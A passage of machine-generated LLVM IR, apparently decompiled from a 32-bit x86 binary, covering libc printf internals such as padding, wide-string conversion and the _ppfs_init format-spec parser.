  br i1 %v1_804e38f, label %dec_label_pc_804e48b, label %dec_label_pc_804e395

dec_label_pc_804e395:                             ; preds = %dec_label_pc_804e376
  store i32 0, i32* %v3_804e38b, align 4
  %v1_804e39d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e39d

dec_label_pc_804e39d:                             ; preds = %dec_label_pc_804e36f, %dec_label_pc_804e395
  %v1_804e39d = phi i32 [ %v0_804e376, %dec_label_pc_804e36f ], [ %v1_804e39d.pre, %dec_label_pc_804e395 ]
  %v0_804e39d = load i32, i32* %eax.global-to-local, align 4
  %v2_804e39d = add i32 %v1_804e39d, -4
  %v3_804e39d = inttoptr i32 %v2_804e39d to i32*
  store i32 %v0_804e39d, i32* %v3_804e39d, align 4
  %v0_804e39e = load i32, i32* %eax.global-to-local, align 4
  %v2_804e39e = add i32 %v1_804e39d, -8
  %v3_804e39e = inttoptr i32 %v2_804e39e to i32*
  store i32 %v0_804e39e, i32* %v3_804e39e, align 4
  %v1_804e39f = add i32 %v1_804e39d, 368
  %v2_804e39f = inttoptr i32 %v1_804e39f to i32*
  %v3_804e39f = load i32, i32* %v2_804e39f, align 4
  %v5_804e39f = add i32 %v1_804e39d, -12
  %v6_804e39f = inttoptr i32 %v5_804e39f to i32*
  store i32 %v3_804e39f, i32* %v6_804e39f, align 4
  %v0_804e3a6 = load i32, i32* @ebp, align 4
  %v1_804e3a6 = add i32 %v0_804e3a6, ptrtoint (i32* @global_var_805098d.116 to i32)
  store i32 %v1_804e3a6, i32* %eax.global-to-local, align 4
  %v2_804e3ac = add i32 %v1_804e39d, -16
  %v3_804e3ac = inttoptr i32 %v2_804e3ac to i32*
  store i32 %v1_804e3a6, i32* %v3_804e3ac, align 4
  %v0_804e3ad = call i32 @__GI_fputs_unlocked()
  store i32 %v0_804e3ad, i32* %eax.global-to-local, align 4
  %v0_804e3b2 = load i32, i32* @esp, align 4
  %v1_804e3b2 = add i32 %v0_804e3b2, 384
  %v2_804e3b2 = inttoptr i32 %v1_804e3b2 to i32*
  %v3_804e3b2 = load i32, i32* %v2_804e3b2, align 4
  store i32 %v3_804e3b2, i32* @eax, align 4
  %v0_804e3b9 = load i32, i32* @ebx, align 4
  store i32 %v0_804e3b9, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_804e3c0 = call i32 @_charpad()
  store i32 %v0_804e3c0, i32* %eax.global-to-local, align 4
  %v0_804e3c5 = load i32, i32* @esp, align 4
  %v1_804e3c5 = add i32 %v0_804e3c5, 16
  %v1_804e3c8 = load i32, i32* @ebx, align 4
  %v12_804e3c8 = icmp eq i32 %v0_804e3c0, %v1_804e3c8
  %v1_804e3ca = icmp eq i1 %v12_804e3c8, false
  br i1 %v1_804e3ca, label %dec_label_pc_804e48b, label %dec_label_pc_804e3d0

dec_label_pc_804e3d0:                             ; preds = %dec_label_pc_804e39d
  %v1_804e3d0 = add i32 %v0_804e3c5, 356
  %v2_804e3d0 = inttoptr i32 %v1_804e3d0 to i32*
  %v3_804e3d0 = load i32, i32* %v2_804e3d0, align 4
  %v4_804e3d0 = icmp eq i32 %v3_804e3d0, 0
  %v1_804e3d8 = icmp eq i1 %v4_804e3d0, false
  br i1 %v1_804e3d8, label %dec_label_pc_804e3fc, label %dec_label_pc_804e3da

dec_label_pc_804e3da:                             ; preds = %dec_label_pc_804e3d0
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804e3dc = load i32, i32* @esi, align 4
  %v1_804e3dc = icmp eq i32 %v0_804e3dc, 0
  br i1 %v1_804e3dc, label %dec_label_pc_804e3f2.thread, label %dec_label_pc_804e3f2

dec_label_pc_804e3f2.thread:                      ; preds = %dec_label_pc_804e3da
  br label %dec_label_pc_804e45d

dec_label_pc_804e3f2:                             ; preds = %dec_label_pc_804e3da
  %v2_804e3e0 = add i32 %v0_804e3c5, 12
  %v3_804e3e0 = inttoptr i32 %v2_804e3e0 to i32*
  store i32 0, i32* %v3_804e3e0, align 4
  %v1_804e3e1 = add i32 %v0_804e3c5, 384
  %v2_804e3e1 = inttoptr i32 %v1_804e3e1 to i32*
  %v3_804e3e1 = load i32, i32* %v2_804e3e1, align 4
  %v5_804e3e1 = add i32 %v0_804e3c5, 8
  %v6_804e3e1 = inttoptr i32 %v5_804e3e1 to i32*
  store i32 %v3_804e3e1, i32* %v6_804e3e1, align 4
  %v0_804e3e8 = load i32, i32* @esi, align 4
  %v2_804e3e8 = add i32 %v0_804e3c5, 4
  %v3_804e3e8 = inttoptr i32 %v2_804e3e8 to i32*
  store i32 %v0_804e3e8, i32* %v3_804e3e8, align 4
  %v0_804e3e9 = load i32, i32* @edi, align 4
  %v3_804e3e9 = inttoptr i32 %v0_804e3c5 to i32*
  store i32 %v0_804e3e9, i32* %v3_804e3e9, align 4
  %v0_804e3ea = load i32, i32* %stack_var_-364, align 4
  %v4_804e3ea = call i32 @__stdio_fwrite(i32 %v0_804e3ea, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e3ea, i32* %eax.global-to-local, align 4
  %v0_804e3ef = load i32, i32* @esp, align 4
  %v1_804e3ef = add i32 %v0_804e3ef, 16
  %v1_804e3f2.pre = load i32, i32* @esi, align 4
  %v12_804e3f2 = icmp eq i32 %v4_804e3ea, %v1_804e3f2.pre
  %v1_804e3f4 = icmp eq i1 %v12_804e3f2, false
  br i1 %v1_804e3f4, label %dec_label_pc_804e48b, label %dec_label_pc_804e45d

dec_label_pc_804e3fc:                             ; preds = %dec_label_pc_804e3d0
  %v1_804e3fc = add i32 %v0_804e3c5, 348
  %v2_804e3fc = inttoptr i32 %v1_804e3fc to i32*
  store i32 0, i32* %v2_804e3fc, align 4
  %v0_804e4598 = load i32, i32* @esi, align 4
  %v1_804e4599 = icmp eq i32 %v0_804e4598, 0
  %v1_804e45b16 = icmp eq i1 %v1_804e4599, false
  br i1 %v1_804e45b16, label %dec_label_pc_804e409, label %dec_label_pc_804e3fc.dec_label_pc_804e45d.loopexit_crit_edge

dec_label_pc_804e3fc.dec_label_pc_804e45d.loopexit_crit_edge: ; preds = %dec_label_pc_804e3fc
  %v0_804e45d.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e45d

dec_label_pc_804e409:                             ; preds = %dec_label_pc_804e3fc, %dec_label_pc_804e457
  %v0_804e409 = phi i32 [ %v2_804e457, %dec_label_pc_804e457 ], [ %v0_804e4598, %dec_label_pc_804e3fc ]
  %tmp103 = icmp ult i32 %v0_804e409, 129
  br i1 %tmp103, label %dec_label_pc_804e418, label %dec_label_pc_804e413

dec_label_pc_804e413:                             ; preds = %dec_label_pc_804e409
  br label %dec_label_pc_804e418

dec_label_pc_804e418:                             ; preds = %dec_label_pc_804e409, %dec_label_pc_804e413
  %storemerge104 = phi i32 [ 128, %dec_label_pc_804e413 ], [ %v0_804e409, %dec_label_pc_804e409 ]
  store i32 %storemerge104, i32* %edx.global-to-local, align 4
  %v0_804e418 = load i32, i32* @esp, align 4
  %v1_804e418 = add i32 %v0_804e418, 332
  %v2_804e41f = add i32 %v0_804e418, -4
  %v3_804e41f = inttoptr i32 %v2_804e41f to i32*
  store i32 %v1_804e418, i32* %v3_804e41f, align 4
  %v0_804e420 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e420 = add i32 %v0_804e418, -8
  %v3_804e420 = inttoptr i32 %v2_804e420 to i32*
  store i32 %v0_804e420, i32* %v3_804e420, align 4
  %v1_804e421 = add i32 %v0_804e418, 340
  store i32 %v1_804e421, i32* %eax.global-to-local, align 4
  %v2_804e428 = add i32 %v0_804e418, -12
  %v3_804e428 = inttoptr i32 %v2_804e428 to i32*
  store i32 %v1_804e421, i32* %v3_804e428, align 4
  %v1_804e429 = add i32 %v0_804e418, 204
  store i32 %v1_804e429, i32* @edi, align 4
  %v2_804e430 = add i32 %v0_804e418, -16
  %v3_804e430 = inttoptr i32 %v2_804e430 to i32*
  store i32 %v1_804e429, i32* %v3_804e430, align 4
  %v0_804e431 = call i32 @__GI_wcsrtombs()
  store i32 %v0_804e431, i32* @ebx, align 4
  %v0_804e438 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804e43d = icmp eq i32 %v0_804e431, 0
  br i1 %v1_804e43d, label %dec_label_pc_804e453, label %dec_label_pc_804e441

dec_label_pc_804e441:                             ; preds = %dec_label_pc_804e418
  %v0_804e441 = load i32, i32* @ebp, align 4
  %v2_804e441 = add i32 %v0_804e438, 12
  %v3_804e441 = inttoptr i32 %v2_804e441 to i32*
  store i32 %v0_804e441, i32* %v3_804e441, align 4
  %v1_804e442 = add i32 %v0_804e438, 384
  %v2_804e442 = inttoptr i32 %v1_804e442 to i32*
  %v3_804e442 = load i32, i32* %v2_804e442, align 4
  %v5_804e442 = add i32 %v0_804e438, 8
  %v6_804e442 = inttoptr i32 %v5_804e442 to i32*
  store i32 %v3_804e442, i32* %v6_804e442, align 4
  %v2_804e449 = add i32 %v0_804e438, 4
  %v3_804e449 = inttoptr i32 %v2_804e449 to i32*
  store i32 %v0_804e431, i32* %v3_804e449, align 4
  %v0_804e44a = load i32, i32* @edi, align 4
  %v3_804e44a = inttoptr i32 %v0_804e438 to i32*
  store i32 %v0_804e44a, i32* %v3_804e44a, align 4
  %v0_804e44b = load i32, i32* %stack_var_-364, align 4
  %v4_804e44b = call i32 @__stdio_fwrite(i32 %v0_804e44b, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e44b, i32* %eax.global-to-local, align 4
  %v0_804e450 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e453

dec_label_pc_804e453:                             ; preds = %dec_label_pc_804e418, %dec_label_pc_804e441
  %v0_804e48b50.in = phi i32 [ %v0_804e438, %dec_label_pc_804e418 ], [ %v0_804e450, %dec_label_pc_804e441 ]
  %v1_804e457 = phi i32 [ 0, %dec_label_pc_804e418 ], [ %v4_804e44b, %dec_label_pc_804e441 ]
  %v0_804e48b50 = add i32 %v0_804e48b50.in, 16
  %v12_804e453 = icmp eq i32 %v1_804e457, %v0_804e431
  %v1_804e455 = icmp eq i1 %v12_804e453, false
  br i1 %v1_804e455, label %dec_label_pc_804e48b, label %dec_label_pc_804e457

dec_label_pc_804e457:                             ; preds = %dec_label_pc_804e453
  %v0_804e457 = load i32, i32* @esi, align 4
  %v2_804e457 = sub i32 %v0_804e457, %v1_804e457
  %v12_804e457 = icmp eq i32 %v2_804e457, 0
  store i32 %v2_804e457, i32* @esi, align 4
  %v1_804e45b = icmp eq i1 %v12_804e457, false
  br i1 %v1_804e45b, label %dec_label_pc_804e409, label %dec_label_pc_804e45d

dec_label_pc_804e45d:                             ; preds = %dec_label_pc_804e457, %dec_label_pc_804e3f2.thread, %dec_label_pc_804e3fc.dec_label_pc_804e45d.loopexit_crit_edge, %dec_label_pc_804e3f2
  %v0_804e45d = phi i32 [ %v1_804e3ef, %dec_label_pc_804e3f2 ], [ %v0_804e45d.pre.pre, %dec_label_pc_804e3fc.dec_label_pc_804e45d.loopexit_crit_edge ], [ %v1_804e3c5, %dec_label_pc_804e3f2.thread ], [ %v0_804e48b50, %dec_label_pc_804e457 ]
  %v1_804e45d = add i32 %v0_804e45d, 8
  %v2_804e45d = inttoptr i32 %v1_804e45d to i32*
  %v3_804e45d = load i32, i32* %v2_804e45d, align 4
  store i32 %v3_804e45d, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804e466 = add i32 %v0_804e45d, 368
  %v2_804e466 = inttoptr i32 %v1_804e466 to i32*
  %v3_804e466 = load i32, i32* %v2_804e466, align 4
  store i32 %v3_804e466, i32* @eax, align 4
  %v0_804e46d = call i32 @_charpad()
  store i32 %v0_804e46d, i32* %eax.global-to-local, align 4
  %v1_804e472 = load i32, i32* @esp, align 4
  %v2_804e472 = add i32 %v1_804e472, 8
  %v3_804e472 = inttoptr i32 %v2_804e472 to i32*
  %v4_804e472 = load i32, i32* %v3_804e472, align 4
  %v15_804e472 = icmp eq i32 %v0_804e46d, %v4_804e472
  %v1_804e476 = icmp eq i1 %v15_804e472, false
  br i1 %v1_804e476, label %dec_label_pc_804e48b, label %dec_label_pc_804e478

dec_label_pc_804e478:                             ; preds = %dec_label_pc_804e45d, %dec_label_pc_804e1f2, %dec_label_pc_804e020
  %v0_804e478 = phi i32 [ %v1_804e472, %dec_label_pc_804e45d ], [ %v0_804e478.pre, %dec_label_pc_804e1f2 ], [ %v1_804e03e, %dec_label_pc_804e020 ]
  %v1_804e478 = add i32 %v0_804e478, 16
  %v2_804e478 = inttoptr i32 %v1_804e478 to i32*
  %v3_804e478 = load i32, i32* %v2_804e478, align 4
  store i32 %v3_804e478, i32* @ebx, align 4
  store i32 %v3_804e478, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804df78.backedge

dec_label_pc_804e483:                             ; preds = %dec_label_pc_804dfb6
  %v1_804e483 = add i32 %v0_804e483, 2
  store i32 %v1_804e483, i32* @ebx, align 4
  br label %dec_label_pc_804df78.backedge

dec_label_pc_804e48b:                             ; preds = %dec_label_pc_804dfa2, %dec_label_pc_804e45d, %dec_label_pc_804e3f2, %dec_label_pc_804e39d, %dec_label_pc_804e376, %dec_label_pc_804e2e6, %dec_label_pc_804e261, %dec_label_pc_804e235, %dec_label_pc_804e1c9, %dec_label_pc_804e453
  %v0_804e48b = phi i32 [ %v0_804e48b50, %dec_label_pc_804e453 ], [ %v0_804e48b.pre.pre, %dec_label_pc_804dfa2 ], [ %v1_804e472, %dec_label_pc_804e45d ], [ %v1_804e3ef, %dec_label_pc_804e3f2 ], [ %v1_804e3c5, %dec_label_pc_804e39d ], [ %v1_804e38b, %dec_label_pc_804e376 ], [ %v0_804e018.lcssa, %dec_label_pc_804e2e6 ], [ %v1_804e279, %dec_label_pc_804e261 ], [ %v1_804e24c, %dec_label_pc_804e235 ], [ %v1_804e1e7, %dec_label_pc_804e1c9 ]
  %v1_804e48b = inttoptr i32 %v0_804e48b to i32*
  store i32 -1, i32* %v1_804e48b, align 4
  br label %dec_label_pc_804e492

dec_label_pc_804e492:                             ; preds = %dec_label_pc_804dfad, %dec_label_pc_804df1b, %dec_label_pc_804df3a, %dec_label_pc_804e48b
  %v0_804e492 = load i32, i32* @esp, align 4
  %v1_804e492 = inttoptr i32 %v0_804e492 to i32*
  %v2_804e492 = load i32, i32* %v1_804e492, align 4
  store i32 %v2_804e492, i32* %eax.global-to-local, align 4
  %v1_804e495 = add i32 %v0_804e492, 348
  %v1_804e49b = inttoptr i32 %v1_804e495 to i32*
  %v2_804e49b = load i32, i32* %v1_804e49b, align 4
  store i32 %v2_804e49b, i32* @ebx, align 4
  ret i32 %v2_804e492

; uselistorder directives
  uselistorder i32 %v1_804e483, { 1, 0 }
  uselistorder i32 %v3_804e478, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804e45d, { 1, 0 }
  uselistorder i32 %v2_804e457, { 1, 2, 0 }
  uselistorder i32 %v0_804e48b50, { 1, 0 }
  uselistorder i32 %v1_804e457, { 1, 0 }
  uselistorder i32 %v0_804e438, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v0_804e3c5, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_804e39d, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804e376, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804e34a, { 1, 0, 2 }
  uselistorder i32 %v6_804e337, { 1, 0 }
  uselistorder i32 %v1_804e334, { 1, 0 }
  uselistorder i32 %v0_804e32d, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804e2b7, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_804e2c7, { 2, 3, 1, 0 }
  uselistorder i32 %v0_804e228, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v0_804e20e, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v0_804e1a7, { 1, 0, 2 }
  uselistorder i32 %v1_804e12b, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v0_804e17e, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_804e107, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804e0c0, { 1, 0 }
  uselistorder i32 %v1_804e0cd, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v3_804e018, { 3, 11, 10, 5, 4, 7, 6, 8, 12, 0, 1, 2, 13, 9, 14, 15 }
  uselistorder i32 %v0_804e018.lcssa, { 0, 8, 7, 6, 9, 24, 23, 12, 13, 14, 15, 16, 17, 11, 10, 19, 18, 22, 21, 20, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_804e014, { 1, 0 }
  uselistorder i32 %v1_804e014.pre, { 1, 0 }
  uselistorder i32 %v1_804e013, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v1_804e010, { 1, 0 }
  uselistorder i32 %v2_804e01481, { 1, 0 }
  uselistorder i32 %v3_804dffa, { 1, 0 }
  uselistorder i32 %v1_804dfb6, { 0, 2, 3, 1 }
  uselistorder i32 %v2_804df82, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804df86, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804df70, { 1, 0, 2 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 1, 2, 6, 0, 5, 4, 3, 7, 8, 9 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 0, 4, 25, 5, 1, 6, 10, 7, 8, 9, 11, 12, 13, 14, 16, 15, 18, 17, 19, 20, 26, 21, 22, 23, 27, 24, 28, 29, 30, 31 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 52, 54, 55, 56, 57 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 -32, { 1, 6, 0, 2, 3, 4, 5 }
  uselistorder i32 33, { 1, 2, 0 }
  uselistorder i32 204, { 2, 0, 3, 1, 4 }
  uselistorder i32 11, { 1, 5, 6, 0, 7, 8, 2, 3, 4, 9 }
  uselistorder i32 55, { 1, 0 }
  uselistorder i32 87, { 1, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 60, { 0, 4, 5, 2, 6, 7, 3, 1 }
  uselistorder i32 100, { 0, 4, 1, 2, 3 }
  uselistorder i32 70, { 1, 0 }
  uselistorder i32 -16, { 6, 7, 1, 2, 3, 4, 5, 8, 9, 0, 10, 11, 24, 25, 26, 15, 17, 18, 14, 16, 13, 19, 12, 20, 21, 22, 23, 36, 33, 34, 30, 31, 32, 35, 29, 27, 28, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_804e492, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804e48b, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804e45d, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804e453, { 1, 0 }
  uselistorder label %dec_label_pc_804e418, { 1, 0 }
  uselistorder label %dec_label_pc_804e409, { 1, 0 }
  uselistorder label %dec_label_pc_804e39d, { 1, 0 }
  uselistorder label %dec_label_pc_804e36f, { 1, 0 }
  uselistorder label %dec_label_pc_804e354, { 1, 0 }
  uselistorder label %dec_label_pc_804e33e, { 1, 0 }
  uselistorder label %dec_label_pc_804e32a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e31e, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804e2b7, { 1, 0 }
  uselistorder label %dec_label_pc_804e2aa, { 1, 0 }
  uselistorder label %dec_label_pc_804e235, { 1, 0 }
  uselistorder label %dec_label_pc_804e1c9, { 1, 0 }
  uselistorder label %dec_label_pc_804e17e, { 1, 0 }
  uselistorder label %dec_label_pc_804e16f, { 6, 2, 1, 3, 5, 0, 4 }
  uselistorder label %dec_label_pc_804e135, { 1, 0 }
  uselistorder label %dec_label_pc_804e11c, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804e0cd, { 1, 0 }
  uselistorder label %dec_label_pc_804e0b4, { 1, 0 }
  uselistorder label %dec_label_pc_804e0a0, { 1, 0 }
  uselistorder label %dec_label_pc_804e09b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e07c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e009, { 1, 0 }
  uselistorder label %dec_label_pc_804e001, { 1, 0 }
  uselistorder label %dec_label_pc_804dfad, { 1, 0 }
  uselistorder label %dec_label_pc_804dfa2, { 1, 0 }
  uselistorder label %dec_label_pc_804df78.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e4a0 = load i32, i32* @esi, align 4
  %v0_804e4a1 = load i32, i32* @ebx, align 4
  store i32 %v0_804e4a1, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_804e4b5 = bitcast i32* %arg1 to i8*
  %v4_804e4b5 = call i32 @__GI_memset(i8* %v3_804e4b5, i32 0, i32 188)
  store i32 %v4_804e4b5, i32* %eax.global-to-local, align 4
  %v0_804e4ba = load i32, i32* @ebx, align 4
  %v1_804e4ba = add i32 %v0_804e4ba, 24
  %v2_804e4ba = inttoptr i32 %v1_804e4ba to i32*
  %v3_804e4ba = load i32, i32* %v2_804e4ba, align 4
  %v4_804e4ba = add i32 %v3_804e4ba, -1
  store i32 %v4_804e4ba, i32* %v2_804e4ba, align 4
  %v0_804e4bd = load i32, i32* @esi, align 4
  %v1_804e4bd = load i32, i32* @ebx, align 4
  %v2_804e4bd = inttoptr i32 %v1_804e4bd to i32*
  store i32 %v0_804e4bd, i32* %v2_804e4bd, align 4
  %v0_804e4bf = load i32, i32* @ebx, align 4
  %v1_804e4bf = add i32 %v0_804e4bf, 40
  store i32 %v1_804e4bf, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e4ca

dec_label_pc_804e4ca:                             ; preds = %dec_label_pc_804e4ca, %entry
  %v0_804e4ca = phi i32 [ %v1_804e4d0, %dec_label_pc_804e4ca ], [ %v1_804e4bf, %entry ]
  %v1_804e4ca = inttoptr i32 %v0_804e4ca to i32*
  store i32 8, i32* %v1_804e4ca, align 4
  %v0_804e4d0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e4d0 = add i32 %v0_804e4d0, 4
  store i32 %v1_804e4d0, i32* %eax.global-to-local, align 4
  %v0_804e4d3 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e4d3 = add i32 %v0_804e4d3, -1
  %v8_804e4d3 = icmp eq i32 %v1_804e4d3, 0
  store i32 %v1_804e4d3, i32* %edx.global-to-local, align 4
  %v1_804e4d4 = icmp eq i1 %v8_804e4d3, false
  br i1 %v1_804e4d4, label %dec_label_pc_804e4ca, label %dec_label_pc_804e4d6

dec_label_pc_804e4d6:                             ; preds = %dec_label_pc_804e4ca
  %v0_804e4d6 = load i32, i32* @esi, align 4
  store i32 %v0_804e4d6, i32* %eax.global-to-local, align 4
  %v1_804e50120 = inttoptr i32 %v0_804e4d6 to i8*
  %v2_804e50121 = load i8, i8* %v1_804e50120, align 1
  %v3_804e50122 = zext i8 %v2_804e50121 to i32
  %v5_804e50123 = and i32 %v1_804e4d3, -256
  %v6_804e50124 = or i32 %v3_804e50122, %v5_804e50123
  store i32 %v6_804e50124, i32* %edx.global-to-local, align 4
  %v4_804e50325 = icmp eq i8 %v2_804e50121, 0
  %v1_804e50526 = icmp eq i1 %v4_804e50325, false
  br i1 %v1_804e50526, label %dec_label_pc_804e4df, label %dec_label_pc_804e507

dec_label_pc_804e4df:                             ; preds = %dec_label_pc_804e4d6, %dec_label_pc_804e501.backedge
  %v6_804e50129 = phi i32 [ %v6_804e501, %dec_label_pc_804e501.backedge ], [ %v6_804e50124, %dec_label_pc_804e4d6 ]
  %v2_804e50128 = phi i8 [ %v2_804e501, %dec_label_pc_804e501.backedge ], [ %v2_804e50121, %dec_label_pc_804e4d6 ]
  %v0_804e4e427 = phi i32 [ %v0_804e4e4.be, %dec_label_pc_804e501.backedge ], [ %v0_804e4d6, %dec_label_pc_804e4d6 ]
  %v10_804e4df = icmp eq i8 %v2_804e50128, 37
  %v1_804e4e2 = icmp eq i1 %v10_804e4df, false
  br i1 %v1_804e4e2, label %dec_label_pc_804e500, label %dec_label_pc_804e4e4

dec_label_pc_804e4e4:                             ; preds = %dec_label_pc_804e4df
  %v1_804e4e4 = add i32 %v0_804e4e427, 1
  store i32 %v1_804e4e4, i32* %eax.global-to-local, align 4
  %v1_804e4e5 = inttoptr i32 %v1_804e4e4 to i8*
  %v2_804e4e5 = load i8, i8* %v1_804e4e5, align 1
  %v11_804e4e5 = icmp eq i8 %v2_804e4e5, 37
  br i1 %v11_804e4e5, label %dec_label_pc_804e500, label %dec_label_pc_804e4ea

dec_label_pc_804e4ea:                             ; preds = %dec_label_pc_804e4e4
  %v1_804e4ed = load i32, i32* @ebx, align 4
  %v2_804e4ed = inttoptr i32 %v1_804e4ed to i32*
  store i32 %v1_804e4e4, i32* %v2_804e4ed, align 4
  %v0_804e4ef = load i32, i32* @ebx, align 4
  %v1_804e4f0 = inttoptr i32 %v0_804e4ef to i32*
  %v2_804e4f0 = call i32 @_ppfs_parsespec(i32* %v1_804e4f0)
  store i32 %v2_804e4f0, i32* %eax.global-to-local, align 4
  %v2_804e4f8 = icmp slt i32 %v2_804e4f0, 0
  br i1 %v2_804e4f8, label %dec_label_pc_804e50b, label %dec_label_pc_804e4fc

dec_label_pc_804e4fc:                             ; preds = %dec_label_pc_804e4ea
  %v0_804e4fc = load i32, i32* @ebx, align 4
  %v1_804e4fc = inttoptr i32 %v0_804e4fc to i32*
  %v2_804e4fc = load i32, i32* %v1_804e4fc, align 4
  %v4_804e501.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e501.backedge

dec_label_pc_804e500:                             ; preds = %dec_label_pc_804e4e4, %dec_label_pc_804e4df
  %v0_804e500 = phi i32 [ %v1_804e4e4, %dec_label_pc_804e4e4 ], [ %v0_804e4e427, %dec_label_pc_804e4df ]
  %v1_804e500 = add i32 %v0_804e500, 1
  br label %dec_label_pc_804e501.backedge

dec_label_pc_804e501.backedge:                    ; preds = %dec_label_pc_804e500, %dec_label_pc_804e4fc
  %v4_804e501.be = phi i32 [ %v4_804e501.pre.pre, %dec_label_pc_804e4fc ], [ %v6_804e50129, %dec_label_pc_804e500 ]
  %v0_804e4e4.be = phi i32 [ %v2_804e4fc, %dec_label_pc_804e4fc ], [ %v1_804e500, %dec_label_pc_804e500 ]
  store i32 %v0_804e4e4.be, i32* %eax.global-to-local, align 4
  %v1_804e501 = inttoptr i32 %v0_804e4e4.be to i8*
  %v2_804e501 = load i8, i8* %v1_804e501, align 1
  %v3_804e501 = zext i8 %v2_804e501 to i32
  %v5_804e501 = and i32 %v4_804e501.be, -256
  %v6_804e501 = or i32 %v3_804e501, %v5_804e501
  store i32 %v6_804e501, i32* %edx.global-to-local, align 4
  %v4_804e503 = icmp eq i8 %v2_804e501, 0
  %v1_804e505 = icmp eq i1 %v4_804e503, false
  br i1 %v1_804e505, label %dec_label_pc_804e4df, label %dec_label_pc_804e501.dec_label_pc_804e507_crit_edge

dec_label_pc_804e501.dec_label_pc_804e507_crit_edge: ; preds = %dec_label_pc_804e501.backedge
  %v0_804e507.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e507

dec_label_pc_804e507:                             ; preds = %dec_label_pc_804e501.dec_label_pc_804e507_crit_edge, %dec_label_pc_804e4d6
  %v0_804e507 = phi i32 [ %v0_804e507.pre, %dec_label_pc_804e501.dec_label_pc_804e507_crit_edge ], [ %v0_804e4d6, %dec_label_pc_804e4d6 ]
  %v1_804e507 = load i32, i32* @ebx, align 4
  %v2_804e507 = inttoptr i32 %v1_804e507 to i32*
  store i32 %v0_804e507, i32* %v2_804e507, align 4
  br label %dec_label_pc_804e50b

dec_label_pc_804e50b:                             ; preds = %dec_label_pc_804e4ea, %dec_label_pc_804e507
  %storemerge = phi i32 [ 0, %dec_label_pc_804e507 ], [ -1, %dec_label_pc_804e4ea ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_804e50b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e50b, i32* @edx, align 4
  %v2_804e50c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e50c, i32* @ebx, align 4
  store i32 %v0_804e4a0, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_804e501, { 1, 0 }
  uselistorder i8 %v2_804e501, { 1, 2, 0 }
  uselistorder i32 %v0_804e4e4.be, { 2, 1, 0 }
  uselistorder i32 %v0_804e4e427, { 1, 0 }
